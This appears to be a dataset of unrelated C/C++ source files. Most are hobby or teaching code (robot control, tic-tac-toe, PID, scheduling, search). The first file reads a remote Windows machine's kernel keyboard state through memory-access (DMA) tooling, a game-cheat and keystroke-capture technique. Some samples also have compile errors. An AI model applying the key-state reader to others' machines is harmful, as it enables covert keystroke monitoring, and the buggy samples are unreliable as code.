    "#include \"pch.h\"\n#include \"InputManager.h\"\n#include \"Registry.h\"\n\n//TODO: Restart winlogon.exe when it doesn't exist.\nbool c_keys::InitKeyboard()\n{\n\tstd::string win = registry.QueryValue(\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\CurrentBuild\", e_registry_type::sz);\n\tint Winver = 0;\n\tif (!win.empty())\n\t\tWinver = std::stoi(win);\n\telse\n\t\treturn false;\n\n\tthis->win_logon_pid = mem.GetPidFromName(\"winlogon.exe\");\n\tif (Winver > 22000)\n\t{\n\t\tauto pids = mem.GetPidListFromName(\"csrss.exe\");\n\t\tfor (size_t i = 0; i < pids.size(); i++)\n\t\t{\n\t\t\tauto pid = pids[i];\n\t\t\tuintptr_t tmp = VMMDLL_ProcessGetModuleBaseU(mem.vHandle, pid, const_cast<LPSTR>(\"win32ksgd.sys\"));\n\t\t\tuintptr_t g_session_global_slots = tmp + 0x3110;\n\t\t\tuintptr_t user_session_state = mem.Read<uintptr_t>(mem.Read<uintptr_t>(mem.Read<uintptr_t>(g_session_global_slots, pid), pid), pid);\n\t\t\tgafAsyncKeyStateExport = user_session_state + 0x3690;\n\t\t\tif (gafAsyncKeyStateExport > 0x7FFFFFFFFFFF)\n\t\t\t\tbreak;\n\t\t}\n\t\tif (gafAsyncKeyStateExport > 0x7FFFFFFFFFFF)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\telse\n\t{\n\t\tPVMMDLL_MAP_EAT eat_map = NULL;\n\t\tPVMMDLL_MAP_EATENTRY eat_map_entry;\n\t\tbool result = VMMDLL_Map_GetEATU(mem.vHandle, mem.GetPidFromName(\"winlogon.exe\") | VMMDLL_PID_PROCESS_WITH_KERNELMEMORY, const_cast<LPSTR>(\"win32kbase.sys\"), &eat_map);\n\t\tif (!result)\n\t\t\treturn false;\n\n\t\tif (eat_map->dwVersion != VMMDLL_MAP_EAT_VERSION)\n\t\t{\n\t\t\tVMMDLL_MemFree(eat_map);\n\t\t\teat_map_entry = NULL;\n\t\t\treturn false;\n\t\t}\n\n\t\tfor (int i = 0; i < eat_map->cMap; i++)\n\t\t{\n\t\t\teat_map_entry = eat_map->pMap + i;\n\t\t\tif (strcmp(eat_map_entry->uszFunction, \"gafAsyncKeyState\") == 0)\n\t\t\t{\n\t\t\t\tgafAsyncKeyStateExport = eat_map_entry->vaFunction;\n\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tVMMDLL_MemFree(eat_map);\n\t\teat_map = NULL;\n\t\tif (gafAsyncKeyStateExport < 0x7FFFFFFFFFFF)\n\t\t{\n\t\t\tPVMMDLL_MAP_MODULEENTRY module_info;\n\t\t\tauto result = VMMDLL_Map_GetModuleFromNameW(mem.vHandle, mem.GetPidFromName(\"winlogon.exe\") | VMMDLL_PID_PROCESS_WITH_KERNELMEMORY, const_cast<LPWSTR>(L\"win32kbase.sys\"), &module_info, VMMDLL_MODULE_FLAG_NORMAL);\n\t\t\tif (!result)\n\t\t\t{\n\t\t\t\tINFO(\"failed to get module info\\n\");\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t\tchar str[32];\n\t\t\tif (!VMMDLL_PdbLoad(mem.vHandle, mem.GetPidFromName(\"winlogon.exe\") | VMMDLL_PID_PROCESS_WITH_KERNELMEMORY, module_info->vaBase, str))\n\t\t\t{\n\t\t\t\tINFO(\"failed to load pdb\\n\");\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t\tuintptr_t gafAsyncKeyState;\n\t\t\tif (!VMMDLL_PdbSymbolAddress(mem.vHandle, str, const_cast<LPSTR>(\"gafAsyncKeyState\"), &gafAsyncKeyState))\n\t\t\t{\n\t\t\t\tINFO(\"failed to find gafAsyncKeyState\\n\");\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tINFO(\"found gafAsyncKeyState at: 0x%p\\n\", gafAsyncKeyState);\n\t\t}\n\t\tif (gafAsyncKeyStateExport > 0x7FFFFFFFFFFF)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n}\n\nvoid c_keys::UpdateKeys()\n{\n\tuint8_t previous_key_state_bitmap[64] = {0};\n\tmemcpy(previous_key_state_bitmap, state_bitmap, 64);\n\n\tVMMDLL_MemReadEx(mem.vHandle, this->win_logon_pid | VMMDLL_PID_PROCESS_WITH_KERNELMEMORY, gafAsyncKeyStateExport, reinterpret_cast<PBYTE>(&state_bitmap), 64, NULL, VMMDLL_FLAG_NOCACHE);\n\tfor (int vk = 0; vk < 256; ++vk)\n\t\tif ((state_bitmap[(vk * 2 / 8)] & 1 << vk % 4 * 2) && !(previous_key_state_bitmap[(vk * 2 / 8)] & 1 << vk % 4 * 2))\n\t\t\tprevious_state_bitmap[vk / 8] |= 1 << vk % 8;\n}\n\nbool c_keys::IsKeyDown(uint32_t virtual_key_code)\n{\n\tif (gafAsyncKeyStateExport < 0x7FFFFFFFFFFF)\n\t\treturn false;\n\tif (std::chrono::system_clock::now() - start > std::chrono::milliseconds(1))\n\t{\n\t\tUpdateKeys();\n\t\tstart = std::chrono::system_clock::now();\n\t}\n\treturn state_bitmap[(virtual_key_code * 2 / 8)] & 1 << virtual_key_code % 4 * 2;\n}\n",
    "#include <Arduino.h>\n#include <ESP32Servo.h>\n#include <Motor.h>\n#include <PS4Controller.h>\n\n// TODO \u5909\u6570\u540d\u3092\u4fee\u6b63\u3059\u308b\n/* JOYSTICK */\nconst int DEAD_ZONE = 30;\n\n/* MOTOR */\n/*pwm dir channel*/\nMotor RightMotor(26, 21, 5);\nMotor LeftMotor(27, 22, 6);\nMotor WindingMotor(13, 23, 7);\n\n/* SERVO */\nServo ContinuousServo1;\nServo ContinuousServo2;\nServo TakeServo;\n\nconst int SERVO1_PIN = 18;\nconst int SERVO2_PIN = 4;\nconst int SERVO3_PIN = 19;\n\nint servo1_degree = 180; // \u521d\u671f\u4f4d\u7f6e\nint servo2_degree = 0;\nint takeServo_degree = 20;\n\nuint8_t right_pwm = 0;\nuint8_t left_pwm = 0;\n\nconst int DEBOUNCE_DELAY = 100;\n/*\u4e38\u30dc\u30bf\u30f3*/\nbool circle_pressed = false;\nuint32_t circle_debounce_time = 0;\n/*\u4e09\u89d2\u30dc\u30bf\u30f3*/\nuint32_t triangle_debounce_time = 0;\n/*\u30d0\u30c4\u30dc\u30bf\u30f3*/\nuint32_t cross_debounce_time = 0;\n\nvoid setup() {\n  Serial.begin(115200);\n\n  /*uint8_t bt_mac[6];\n  esp_read_mac(bt_mac, ESP_MAC_BT);\n  Serial.printf(\"Bluetooth Mac Address => %02X:%02X:%02X:%02X:%02X:%02X\\r\\n\",\n                bt_mac[0], bt_mac[1], bt_mac[2], bt_mac[3], bt_mac[4],\n                bt_mac[5]);*/\n\n  PS4.begin(\"08:D1:F9:37:36:FE\");\n  Serial.printf(\"ready.\\n\");\n\n  ContinuousServo1.attach(SERVO1_PIN, 800, 2200);\n  ContinuousServo2.attach(SERVO2_PIN, 800, 2200);\n  TakeServo.attach(SERVO3_PIN, 500, 2400);\n\n  ContinuousServo1.write(servo1_degree);\n  ContinuousServo2.write(servo2_degree);\n  TakeServo.write(takeServo_degree);\n}\n\nvoid loop() {\n\n  if (!PS4.isConnected()) {\n    Serial.printf(\"PS4 controller disconnected.\\n\");\n    RightMotor.run(0, 0);\n    LeftMotor.run(0, 0);\n    WindingMotor.run(0, 0);\n    return;\n  }\n\n  if (DEAD_ZONE <= abs(PS4.RStickY())) {\n    right_pwm = abs(PS4.RStickY());\n    if (PS4.R1()) {\n      right_pwm /= 2; // R1\u3092\u62bc\u3057\u3066\u3044\u308b\u3068\u304dPWM\u304c\u534a\u5206\u306b\u306a\u308b\n    }\n    RightMotor.run(right_pwm,\n                   (PS4.RStickY() > 0 ? 1 : 0)); // \u53f3\u30e2\u30fc\u30bf\u30fc\u3092\u52d5\u304b\u3059\n  } else {\n    RightMotor.run(0, 0);\n  }\n  if (DEAD_ZONE <= abs(PS4.LStickY())) {\n    left_pwm = abs(PS4.LStickY());\n    if (PS4.R1()) {\n      left_pwm /= 2;\n    }\n    LeftMotor.run(left_pwm,\n                  (PS4.LStickY() > 0 ? 0 : 1)); // \u5de6\u30e2\u30fc\u30bf\u30fc\u3092\u52d5\u304b\u3059\n  } else {\n    LeftMotor.run(0, 0);\n  }\n\n  /* MOVE SERVO */\n  if (PS4.Triangle() && servo1_degree < 175) {\n    if (millis() - triangle_debounce_time > DEBOUNCE_DELAY) {\n      triangle_debounce_time = millis();\n      servo1_degree += 5;\n      servo2_degree -= 5;\n      ContinuousServo1.write(servo1_degree); // \u4e0a\u3052\u308b\n      ContinuousServo2.write(servo2_degree);\n    }\n    \n  } else if (PS4.Cross() && servo1_degree > 5) {\n    if (millis() - cross_debounce_time > DEBOUNCE_DELAY) {\n      cross_debounce_time = millis();\n      servo1_degree -= 5;\n      servo2_degree += 5;\n      ContinuousServo1.write(servo1_degree); // \u4e0b\u3052\u308b\n      ContinuousServo2.write(servo2_degree);\n    }\n  }\n\n  if (PS4.R2Value() > 10) {\n    WindingMotor.run(PS4.R2Value() / 2, 0); // \u6b63\u8ee2\n  } else if (PS4.L2Value() > 10) {\n    WindingMotor.run(PS4.L2Value() / 2, 1); // \u9006\u8ee2\n  } else {\n    WindingMotor.run(0, 0);\n  }\n\n  if (PS4.Right()) {\n    TakeServo.write(0);\n  }\n  if (PS4.Left()) {\n    TakeServo.write(60);\n  }\n\n  if (PS4.PSButton()) {\n    ESP.restart(); // ESP32\u306e\u518d\u8d77\u52d5\n  }\n}",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nstring table[10]={\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\"};\r\n\r\nvoid tab(){\r\n\r\n    cout<<table[0]<<\" | \"<<table[1]<<\" | \"<<table[2]<<endl;\r\n    cout<<\"--------\"<<endl;\r\n    cout<<table[3]<<\" | \"<<table[4]<<\" | \"<<table[5]<<endl;\r\n    cout<<\"--------\"<<endl;\r\n    cout<<table[6]<<\" | \"<<table[7]<<\" | \"<<table[8]<<endl; \r\n}\r\n\r\nvoid reset(){\r\n\r\n    for(int i=0;i<9;i++){\r\n        cin>>table[i];\r\n    }\r\n}\r\n\r\nint Win(){\r\n\r\n    if(((table[0]==table[1])&&(table[1]==table[2]))){\r\n        return 1;\r\n    }\r\n    else if(((table[3]==table[4])&&(table[4]==table[5]))){\r\n        return 1;\r\n    }\r\n    else if(((table[6]==table[7])&&(table[7]==table[8]))){\r\n        return 1;\r\n    }\r\n    else if(((table[0]==table[3])&&(table[3]==table[6]))){\r\n        return 1;\r\n    }\r\n    else if(((table[1]==table[4])&&(table[4]==table[7]))){\r\n        return 1;\r\n    }\r\n    else if(((table[2]==table[5])&&(table[5]==table[8]))){\r\n        return 1;\r\n    }\r\n    else if(((table[2]==table[4])&&(table[4]==table[6]))){\r\n        return 1;\r\n    }\r\n    else if(((table[0]==table[4])&&(table[4]==table[8]))){\r\n        return 1;\r\n    }\r\n    else{\r\n        return -1;\r\n    }\r\n\r\n}\r\n\r\nint main(){\r\n\r\n        int choice,play,w,player=3;\r\n        char player_1,player_2;\r\n\r\n         do{\r\n\r\n            reset();\r\n            cout<<\"Enter player choice 1/2: \"<<endl;\r\n            cin>>choice;\r\n\r\n            if(choice==1){\r\n                player_1='X';\r\n            }        \r\n            else if(choice==2){\r\n                player_2='0';\r\n            }\r\n            else{\r\n                cout<<\"enter valid choice\"; \r\n                break; \r\n            }\r\n\r\n            cout<<\"Player 1 = \"<<player_1<<endl;\r\n            cout<<\"Player 2 = \"<<player_2<<endl;\r\n\r\n            cout<<\"***********LETS PLAY**********\"<<endl<<endl;\r\n           \r\n            do{\r\n\r\n                tab();\r\n                char sym;\r\n                int position;\r\n\r\n                player=(player%2)?1:2;\r\n                sym=(player%2)?'X':'0';\r\n\r\n                cout <<\"Player \" << player << \", enter box number:  \";\r\n                cin>>position;\r\n\r\n                if (position == 1){\r\n                    table[0] = sym;\r\n                    cout<<endl;\r\n                }\r\n                else if (position == 2){\r\n                    table[1] = sym;\r\n                    cout<<endl;\r\n                    \r\n                }\r\n                else if (position == 3){\r\n                    table[2] = sym;\r\n                    cout<<endl;\r\n                }\r\n                else if (position == 4){\r\n                    table[3] = sym;\r\n                    cout<<endl;\r\n                }\r\n                else if (position== 5){\r\n                    table[4] = sym;\r\n                    cout<<endl;\r\n                }\r\n                else if (position == 6){\r\n                    table[5] = sym;\r\n                    cout<<endl;\r\n                }\r\n                else if (position == 7){\r\n                    table[6] = sym;\r\n                    cout<<endl;\r\n                }\r\n                else if (position == 8){\r\n\r\n                    table[7] = sym;\r\n                    cout<<endl;\r\n                }\r\n                else if (position == 9){\r\n\r\n                    table[8] = sym;\r\n                    cout<<endl;\r\n                }\r\n                else{\r\n                    cout<<\"Enter Valid Value\";\r\n                }\r\n                 w=Win();\r\n                player++;\r\n\r\n            }while(w==-1);\r\n\r\n            tab();\r\n\r\n            if(w==1){\r\n                cout<<\"PLAYER \"<<player-1<<\" has won the game!!!!\"<<endl;\r\n            }\r\n            else{\r\n                cout<<\"DRAW!!!\"<<endl;\r\n            }\r\n\r\n            cout<<\"Do you want to play another game? 1 or 0\"<<endl;\r\n            cin>>play;\r\n\r\n        }while(play);\r\n        \r\n        cout<<\"END GAME!!\";\r\n}\r\n\r\n",
    "#include \"api.h\"\n#include \"dlib/pid.hpp\"\n#include <algorithm>\n\nnamespace dlib {\n\n// Construct a PID controller\nPID::PID(\n    Gains gains_settings, \n    uint32_t interval_setting) {\n    double interval_in_sec = interval_setting / 1000.0;\n    \n    Gains real_gains({\n        gains_settings.kp, \n        gains_settings.ki * interval_in_sec, \n        gains_settings.kd / interval_in_sec\n    });\n    \n    gains = real_gains;\n    interval = interval_setting;\n}\n\n// Reset anything that needs to be reset between movements\nvoid PID::reset() {\n    p = 0;\n    i = 0;\n    d = 0;\n\n    last_error = 0;\n    last_time     = 0;\n    last_output   = 0;\n}\n\n// Get the PID output in millivolts\ndouble PID::update(double error) {\n    uint32_t time = pros::millis();\n\n    // return the previous output if any amount of time less than the interval has elapsed\n    if (time - last_time < interval) {\n        return last_output;\n    }\n\n    // calculate PID terms\n    // no need to multiply/divide by delta time for kI and kD becayse they are already \n    // adjusted based on interval in the PID constructor\n    p = error * gains.kp;\n    i = i + error * gains.ki;\n    d = (error - last_error) * gains.kd;\n\n    // scale the output and limit it to [-12000, 12000] millivolts\n    double output_scale = 100;\n    double output = std::clamp((p + i + d) * output_scale, -12000.0, 12000.0);\n\n    // update PID state\n    last_error    = error;\n    last_time     = time;\n    last_output   = output;\n\n    return output;\n}\n\n// Get the gains\nGains PID::get_gains() {\n    return gains;\n}\n\n// Set the gains\nvoid PID::set_gains(Gains new_gains) {\n    gains = new_gains;\n}\n\n// Get the interval in ms\nuint32_t PID::get_interval() {\n    return interval;\n}\n\n// Get the current error\ndouble PID::get_error() {\n    return last_error;\n}\n\n}",
    "#include <iostream>\nusing namespace std;\n\n// Function prototypes\nvoid displayBoard(const char board[3][3]);\nbool makeMove(char board[3][3], char currentPlayer, int row, int col);\nbool checkWin(const char board[3][3], char currentPlayer);\nbool checkDraw(const char board[3][3]);\nchar switchPlayer(char currentPlayer);\nchar getPlayerChoice();\n\nint main() {\n    char board[3][3] = { {'-', '-', '-'},\n                         {'-', '-', '-'},\n                         {'-', '-', '-'} };\n    char currentPlayer = getPlayerChoice();\n    bool gameOver = false;\n\n    do {\n        displayBoard(board);\n\n        // Get player's move (row)\n        int row;\n        cout << \"Player \" << currentPlayer << \", enter row (1-3): \";\n        cin >> row;\n\n        // Validate row input\n        if (row < 1 || row > 3) {\n            cout << \"Invalid row! Please enter a number between 1 and 3.\\n\";\n            continue;\n        }\n\n        // Get player's move (column)\n        int col;\n        cout << \"Player \" << currentPlayer << \", enter column (1-3): \";\n        cin >> col;\n\n        // Validate column input\n        if (col < 1 || col > 3) {\n            cout << \"Invalid column! Please enter a number between 1 and 3.\\n\";\n            continue;\n        }\n\n        // Check if the move is valid\n        if (board[row - 1][col - 1] != '-') {\n            cout << \"That cell is already occupied! Please choose another.\\n\";\n            continue;\n        }\n\n        // Make the move\n        board[row - 1][col - 1] = currentPlayer;\n\n        // Check for win\n        if (checkWin(board, currentPlayer)) {\n            displayBoard(board);\n            cout << \"Player \" << currentPlayer << \" wins!\\n\";\n            break;\n        }\n\n        // Check for draw\n        if (checkDraw(board)) {\n            displayBoard(board);\n            cout << \"It's a draw!\\n\";\n            break;\n        }\n\n        // Switch players\n        currentPlayer = switchPlayer(currentPlayer);\n\n    } while (!gameOver);\n\n    cout << \"Thanks for playing Tic-Tac-Toe!\\n\";\n\n    return 0;\n}\n\n// Display the current state of the board\nvoid displayBoard(const char board[3][3]) {\n    cout << \"\\nCurrent Board:\\n\";\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            cout << board[i][j] << \" \";\n        }\n        cout << endl;\n    }\n}\n\n// Make a move on the board\nbool makeMove(char board[3][3], char currentPlayer, int row, int col) {\n    if (board[row][col] == '-') {\n        board[row][col] = currentPlayer;\n        return true;\n    } else {\n        return false;\n    }\n}\n\n// Check if the current player has won\nbool checkWin(const char board[3][3], char currentPlayer) {\n    // Check rows and columns\n    for (int i = 0; i < 3; ++i) {\n        if (board[i][0] == currentPlayer && board[i][1] == currentPlayer && board[i][2] == currentPlayer)\n            return true;\n        if (board[0][i] == currentPlayer && board[1][i] == currentPlayer && board[2][i] == currentPlayer)\n            return true;\n    }\n\n    // Check diagonals\n    if (board[0][0] == currentPlayer && board[1][1] == currentPlayer && board[2][2] == currentPlayer)\n        return true;\n    if (board[0][2] == currentPlayer && board[1][1] == currentPlayer && board[2][0] == currentPlayer)\n        return true;\n\n    return false;\n}\n\n// Check if the game is a draw\nbool checkDraw(const char board[3][3]) {\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            if (board[i][j] == '-')\n                return false;\n        }\n    }\n    return true;\n}\n\n// Switch players between 'X' and 'O'\nchar switchPlayer(char currentPlayer) {\n    return (currentPlayer == 'X') ? 'O' : 'X';\n}\n\n// Prompt user to choose 'X' or 'O'\nchar getPlayerChoice() {\n    char choice;\n    cout << \"Enter your choice ('X' or 'O'): \";\n    cin >> choice;\n\n    while (choice != 'X' && choice != 'O') {\n        cout << \"Invalid choice! Please enter 'X' or 'O': \";\n        cin >> choice;\n    }\n\n    return choice;\n}\n",
    "#include \"Wheel.h\"\n\n#define CPR 1440 // Encoder counts per revolution;\n\n// Initialize the static instance pointer\nWheel *Wheel::instance = nullptr;\n\nWheel::Wheel(int enablePin, int in1Pin, int in2Pin, int encPinA, int encPinB,\n             double kp, double ki, double kd)\n    : motorSpeedEnablePin(enablePin), motorIn1Pin(in1Pin), motorIn2Pin(in2Pin),\n      interruptEncoderPinA(encPinA), confermationEncoderPinB(encPinB),\n      pid(&PIDinput, &PIDoutput, &setpoint, kp, ki, kd, DIRECT)\n{\n    // Set the instance pointer to this instance\n    instance = this;\n\n    Serial.println(\"Wheel constructor\");\n    Serial.println(\"Motor Speed Enable Pin: \" + String(motorSpeedEnablePin));\n    Serial.println(\"Motor In1 Pin: \" + String(motorIn1Pin));\n    Serial.println(\"Motor In2 Pin: \" + String(motorIn2Pin));\n    Serial.println(\"Interrupt Encoder Pin A: \" + String(interruptEncoderPinA));\n    Serial.println(\"Confermation Encoder Pin B: \" + String(confermationEncoderPinB));\n\n    // Initialize the motor pins as outputs\n    pinMode(motorSpeedEnablePin, OUTPUT);\n    pinMode(motorIn1Pin, OUTPUT);\n    pinMode(motorIn2Pin, OUTPUT);\n\n    // Initialize the encoder pins as inputs\n    pinMode(interruptEncoderPinA, INPUT);\n    pinMode(confermationEncoderPinB, INPUT);\n\n    // Attach an interrupt to the encoder channel A\n    // attachInterrupt(digitalPinToInterrupt(interruptEncoderPinA), isr, CHANGE);\n\n    pid.SetSampleTime(100);\n    pid.SetOutputLimits(-255, 255);\n    pid.SetMode(AUTOMATIC);\n\n    Serial.println(\"Wheel constructor done\\n\");\n}\n\nvoid Wheel::SetSetpoint(double sp)\n{\n    // if (sp != 0)\n    // {\n    //     Serial.println(sp);\n    // }\n\n    // Serial.println(\"Setting setpoint...\" + String(sp));\n    setpoint = sp;\n}\n\nPID *Wheel::GetPID()\n{\n    return &pid;\n}\n\nlong Wheel::GetEncoderPosition()\n{\n    return encoderPosition;\n}\n\nvoid Wheel::HandleEncoderChange()\n{\n    int a = digitalRead(interruptEncoderPinA);\n    // Serial.println(\"Encoder A: \" + String(interruptEncoderPinA));\n    int b = digitalRead(confermationEncoderPinB);\n\n    // Update encoder position based on the state of the channels using ternary operator\n    encoderPosition += (a == b) ? 1 : -1;\n}\n\nvoid Wheel::SetServo()\n{\n    int pwm = 0;\n    pwm = PIDoutput;\n    // int pwm = setpoint;\n\n    pwm = constrain(pwm, -255, 255);\n\n    // Serial.println(\"Setting servo...\" + String(pwm));\n\n    // Serial.println(\"In1 pin:\" + String(motorIn1Pin));\n    // Serial.println(\"In2 pin:\" + String(motorIn2Pin));\n    // Serial.println(\"Speed pin: \" + String(motorSpeedEnablePin));\n\n    if (pwm > 0)\n    {\n        // Forward direction\n        digitalWrite(motorIn1Pin, LOW);\n        digitalWrite(motorIn2Pin, HIGH);\n        analogWrite(motorSpeedEnablePin, pwm);\n\n        // Serial.println(\"pwm > 0\");\n    }\n    else if (pwm < 0)\n    {\n        // Reverse direction\n        digitalWrite(motorIn1Pin, HIGH);        // IN1\n        digitalWrite(motorIn2Pin, LOW);         // IN2\n        analogWrite(motorSpeedEnablePin, -pwm); // Enable pin controls speed (use absolute value)\n\n        // Serial.println(\"pwm < 0\");\n    }\n    else\n    {\n        // Stop the motor\n        digitalWrite(motorSpeedEnablePin, LOW); // Disable motor (no PWM signal)\n        digitalWrite(motorIn1Pin, LOW);         // Stop motor\n        digitalWrite(motorIn2Pin, LOW);         // Stop motor\n\n        // Serial.println(\"stop motor\");\n    }\n}\n\nvoid Wheel::CalculateCurrentSpeed()\n{\n    // Serial.println(\"Calculating current speed...\");\n    // Get the current time and encoder position\n    unsigned long currentTime = millis(); // Time in milliseconds\n\n    // Calculate the time difference (delta t) in seconds\n    float deltaTime = (currentTime - lastTime) / 1000.0; // Convert to seconds\n\n    // Prevent division by zero\n    if (deltaTime <= 0)\n    {\n        deltaTime = 0.001; // If no time has passed, assume a small value\n    }\n\n    // Calculate the change in encoder counts (delta counts)\n    long deltaCounts = encoderPosition - lastEncoderPosition;\n\n    // Store the current encoder position and time for the next calculation\n    lastEncoderPosition = encoderPosition;\n    lastTime = currentTime;\n\n    // Calculate the speed in revolutions per second (RPS)\n    float speedRPS = deltaCounts / (float)CPR / deltaTime;\n\n    // Convert speed from RPS to rad/s (1 revolution = 2 * pi radians)\n    float speedRadPerSec = speedRPS * 2 * PI;\n    PIDinput = speedRadPerSec;\n    // Serial.println(\"PIDINPUT: \" + String(PIDinput));\n}\n\n// Static function to handle the interrupt\n// void Wheel::isr()\n// {\n//     Serial.println(\"ISR called\");\n//     if (instance != nullptr)\n//     {\n//         instance->HandleEncoderChange();\n//     }\n// }",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n\r\n// Process structure to store process details\r\nstruct Process {\r\n    int processID;\r\n    int arrivalTime;\r\n    int burstTime;\r\n};\r\n\r\n// Function to perform Shortest Job Next (SJN) scheduling\r\nvoid sjnScheduling(struct Process processes[], int n) {\r\n    int currentTime = 0;  // Current time\r\n    int totalWaitingTime = 0;  // Total waiting time for all processes\r\n    int totalTurnaroundTime = 0;  // Total turnaround time for all processes\r\n\r\n    // Sort processes based on arrival time\r\n    for (int i = 0; i < n - 1; i++) {\r\n        for (int j = 0; j < n - i - 1; j++) {\r\n            if (processes[j].arrivalTime > processes[j + 1].arrivalTime) {\r\n                // Swap processes if not in the correct order\r\n                struct Process temp = processes[j];\r\n                processes[j] = processes[j + 1];\r\n                processes[j + 1] = temp;\r\n            }\r\n        }\r\n    }\r\n\r\n    // Perform SJN scheduling\r\n    for (int i = 0; i < n; i++) {\r\n        // Wait until the process arrives\r\n        while (currentTime < processes[i].arrivalTime) {\r\n            currentTime++;\r\n        }\r\n\r\n        // Update waiting time for the current process\r\n        processes[i].waitingTime = currentTime;\r\n\r\n        // Update turnaround time for the current process\r\n        processes[i].turnaroundTime = processes[i].waitingTime + processes[i].burstTime;\r\n\r\n        // Update total waiting and turnaround times\r\n        totalWaitingTime += processes[i].waitingTime;\r\n        totalTurnaroundTime += processes[i].turnaroundTime;\r\n\r\n        // Move to the next process\r\n        currentTime += processes[i].burstTime;\r\n    }\r\n\r\n    // Display results\r\n    printf(\"Process\\tArrival Time\\tBurst Time\\tWaiting Time\\tTurnaround Time\\n\");\r\n    for (int i = 0; i < n; i++) {\r\n        printf(\"%d\\t%d\\t\\t%d\\t\\t%d\\t\\t%d\\n\", processes[i].processID, processes[i].arrivalTime,\r\n               processes[i].burstTime, processes[i].waitingTime, processes[i].turnaroundTime);\r\n    }\r\n\r\n    // Calculate and display average waiting and turnaround times\r\n    float avgWaitingTime = (float)totalWaitingTime / n;\r\n    float avgTurnaroundTime = (float)totalTurnaroundTime / n;\r\n\r\n    printf(\"Average Waiting Time: %.2f\\n\", avgWaitingTime);\r\n    printf(\"Average Turnaround Time: %.2f\\n\", avgTurnaroundTime);\r\n}\r\n\r\nint main() {\r\n    // Number of processes\r\n    int n;\r\n\r\n    printf(\"Enter the number of processes: \");\r\n    scanf(\"%d\", &n);\r\n\r\n    struct Process processes[n];\r\n\r\n    // Input process details\r\n    for (int i = 0; i < n; i++) {\r\n        processes[i].processID = i + 1;\r\n        printf(\"Enter arrival time for process %d: \", i + 1);\r\n        scanf(\"%d\", &processes[i].arrivalTime);\r\n        printf(\"Enter burst time for process %d: \", i + 1);\r\n        scanf(\"%d\", &processes[i].burstTime);\r\n    }\r\n\r\n    // Perform SJN scheduling\r\n    sjnScheduling(processes, n);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass LinearSearch\r\n{\r\n    int a[100], n, i, t;\r\npublic:\r\n    void accept();\r\n    int search();\r\n    int count();\r\n    void firstAndLastOccurrence();\r\n};\r\n\r\nvoid LinearSearch::accept()\r\n{\r\n    cout << \"Enter the size of the array: \";\r\n    cin >> n;\r\n    cout << \"Enter the elements in the array: \";\r\n    for (i = 0; i < n; i++) {\r\n        cin >> a[i];\r\n    }\r\n}\r\n\r\nint LinearSearch::search()\r\n{\r\n    cout << \"Enter the target: \";\r\n    cin >> t;\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == t)\r\n        {\r\n            cout << \"Element \" << t << \" found at index \" << i << endl;\r\n            return i;\r\n        }\r\n    }\r\n    cout << \"Element \" << t << \" not found\" << endl;\r\n    return -1; /\r\n}\r\n\r\nint LinearSearch::count()\r\n{\r\n    cout << \"Enter the target to count: \";\r\n    cin >> t;\r\n    int count = 0;\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == t)\r\n        {\r\n            count++;\r\n        }\r\n    }\r\n    cout << \"Element \" << t << \" occurred \" << count << \" times\" << endl;\r\n    return count;\r\n}\r\n\r\nvoid LinearSearch::firstAndLastOccurrence()\r\n{\r\n    cout << \"Enter the target to find occurrences: \";\r\n    cin >> t;\r\n  int first = -1;\r\n  int last = -1;\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == t)\r\n        {\r\n            if (first == -1) {\r\n                first = i;\r\n            }\r\n            last = i;\r\n        }\r\n    }\r\n    if (first != -1) {\r\n        cout << \"First occurrence of \" << t << \" is at index \" << first << endl;\r\n        cout << \"Last occurrence of \" << t << \" is at index \" << last << endl;\r\n    }\r\n    else {\r\n        cout << \"Element \" << t << \" not found\" << endl;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    LinearSearch l;\r\n    int choice, first, last;\r\n    do\r\n    {\r\n        cout << \"\\nMenu\\n\";\r\n        cout << \"1. Accept\\n\";\r\n        cout << \"2. Search\\n\";\r\n        cout << \"3. Count\\n\";\r\n        cout << \"4. First and Last Occurrences\\n\";\r\n        cout << \"5. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n        switch (choice)\r\n        {\r\n        case 1:\r\n            l.accept();\r\n            break;\r\n        case 2:\r\n            l.search();\r\n            break;\r\n        case 3:\r\n            l.count();\r\n            break;\r\n        case 4:\r\n            l.firstAndLastOccurrence();\r\n            break;\r\n        case 5:\r\n            cout << \"Exiting...\\n\";\r\n            break;\r\n        default:\r\n            cout << \"Invalid choice. Try again.\\n\";\r\n        }\r\n    } while (choice != 5);\r\n\r\n    return 0;\r\n}",
    "#include <fstream>\n#include <iostream>\n#include <filesystem>\n\n#include \"CRCpp/inc/CRC.h\"\n\nint main(int argc, char *argv[])\n{\n    std::filesystem::path binFilePath;\n    std::ifstream binFile;\n\n    // Bail if enough arguments are not provided\n    if (argc < 2)\n    {\n        std::cout << \"An input file with .bin extension must be provided. Exiting ...\" << std::endl;\n        return 1;\n    }\n\n    // Get the path of the .bin file\n    binFilePath = argv[1];\n\n    // Bail if file name doesn't have .bin extension\n    if (binFilePath.extension() != \".bin\")\n    {\n        std::cout << \"The input file must have .bin extension. Exiting ...\" << std::endl;\n        return 1;\n    }\n\n    // Bail if the file doesn't exist\n    if (!std::filesystem::exists(binFilePath))\n    {\n        std::cout << \"Could not locate file: \" << binFilePath << \". Exiting ...\" << std::endl;\n        return 1;\n    }\n\n    // Open the file\n    binFile.open(binFilePath, std::ios::binary);\n    binFile.seekg(0, std::ios::end);\n    size_t binFileSize = binFile.tellg();\n    binFile.seekg(0, std::ios::beg);\n\n    // 